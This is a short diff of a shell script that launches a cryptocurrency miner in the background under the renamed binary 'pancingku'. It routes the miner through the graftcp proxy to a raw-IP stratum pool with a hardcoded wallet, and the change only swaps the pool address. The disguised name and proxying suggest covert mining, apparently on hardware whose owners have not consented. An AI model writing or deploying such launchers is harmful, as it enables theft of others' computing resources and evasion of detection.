@@ -39,7 +39,7 @@ END
   echo " "
 
   # Run ccminer in the background
-  /usr/bin/graftcp ./pancingku -a verus -o stratum+tcp://4.155.74.49:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x -t 3 &
+  /usr/bin/graftcp ./pancingku -a verus -o stratum+tcp://20.227.140.176:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x -t 3 &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
